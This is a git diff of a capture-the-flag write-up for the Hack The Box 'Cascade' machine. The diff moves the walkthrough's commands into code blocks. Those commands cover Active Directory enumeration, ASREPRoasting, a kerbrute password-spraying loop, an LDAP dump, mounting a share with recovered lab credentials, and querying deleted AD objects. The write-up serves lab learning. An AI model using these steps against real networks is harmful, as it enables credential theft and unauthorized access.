@@ -72,19 +72,22 @@ Host script results:
 
 we run it using the `-A` switch as well as `-oY` to output into **YAML format**.
 
-Command: `enum4linux-ng -A 10.10.10.182 -oY e4lng-output`
+**Command:** 
+```bash
+enum4linux-ng -A 10.10.10.182 -oY e4lng-output
+```
 
 we get a bunch of cool stuff:
 
-1. usernames
+- **Usernames**
 
 ![e4lng-output-users](/assets/Cascade/e4lng-output-users.jpg)
 
-2. groups
+- **Groups**
 
 ![e4lng-output-groups](/assets/Cascade/e4lng-output-groups.jpg)
 
-3. password policy
+- **Password Policy**
 
 ![e4lng-output-pass-pol](/assets/Cascade/e4lng-output-pass-pol.jpg)
 
@@ -93,7 +96,10 @@ This is great! We have a userlist that we can use to do **ASREPRoasting** and we
 ### Time Saving #1: ASREPRoasting
 *To save time,* we're going to do the **ASREPRoast** first because it's a quick check and has a high chance of giving us creds (*if we crack the hash*).
 
-Command: `GetNPUsers.py -dc-ip 10.10.10.182 -request -debug -usersfile users.txt cascade.local/`
+**Command:** 
+```bash
+GetNPUsers.py -dc-ip 10.10.10.182 -request -debug -usersfile users.txt cascade.local/
+```
 
 **Note:** *I generally prefer to use the* `-debug` *flag with everything. It can save me a lot of time in troubleshooting.*
 
@@ -106,7 +112,10 @@ we also notice some accounts got another type of error: `KDC_ERR_CLIENT_REVOKED(
 ### Time Saving #2: Password Spraying in the background
 *Since the password policy contained no user lockout,* we're good to go spraying :D
 
-Command: `for i in $(cat /opt/Seclists/Passwords/Common-Credentials/500-worst-passwords.txt); do kerbrute passwordspray --dc 10.10.10.182 -d cascade.local users.txt $i | grep -oP '\[\+\].*'; done`
+**Command:** 
+```bash
+for i in $(cat /opt/Seclists/Passwords/Common-Credentials/500-worst-passwords.txt); do kerbrute passwordspray --dc 10.10.10.182 -d cascade.local users.txt $i | grep -oP '\[\+\].*'; done
+```
 
 what this does:
 
@@ -136,7 +145,10 @@ This is because it was there in the `enum4linux-ng` output.
 ### LDAP
 We're going to enumerate **LDAP** and see if we can find something there.
 
-Command: `ldapsearch -x -H ldap://10.10.10.182 -b 'dc=cascade,dc=local'`
+**Command:**
+```bash
+ldapsearch -x -H ldap://10.10.10.182 -b 'dc=cascade,dc=local'
+```
 
 The output was huge (6k+ lines). So we saved it to `ldap-output`
 
@@ -235,9 +247,15 @@ Using `crackmapexec` with the `--shares` flag, we get the below:
 
 ![steve-smb-access](/assets/Cascade/steve-smb-access.jpg)
 
-we mount the share with: `mount -t cifs -o 'username=s.smith,password=sT333ve2' //10.10.10.182/Audit$ /mnt`
+we mount the share with: 
+```bash
+mount -t cifs -o 'username=s.smith,password=sT333ve2' //10.10.10.182/Audit$ /mnt
+```
 
-and list the files with: `find /mnt -type f 2>/dev/null`
+and list the files with:
+```bash
+find /mnt -type f 2>/dev/null
+```
 
 ![mount-and-find](/assets/Cascade/mount-and-find.jpg)
 
@@ -296,7 +314,7 @@ We find the it in the `.exe` code
 
 ![dnspy-casc-exe](/assets/Cascade/dnspy-casc-exe.jpg)
 
-it's `c4scadek3y654321`
+it's **"c4scadek3y654321"**
 
 *Looking at the code,* it seems that the `.exe` reads the encrypted password from the database and decrypts it using the `DecryptString` function before moving on to carry out its tasks.
 
@@ -339,7 +357,10 @@ But eventually get the idea of checking all the attributes for the `TempAdmin` u
 
 Just in case his password was in one of them. Just like the `r.thompson` user or something.
 
-Command: `Get-ADObject -ldapFilter:"(msDS-LastKnownRDN=*)" -IncludeDeletedObjects -Properties * | Select -Last 1`
+**Command:**
+```powershell
+Get-ADObject -ldapFilter:"(msDS-LastKnownRDN=*)" -IncludeDeletedObjects -Properties * | Select -Last 1
+```
 
 ![temp-admin-password](/assets/Cascade/temp-admin-password.jpg)
 
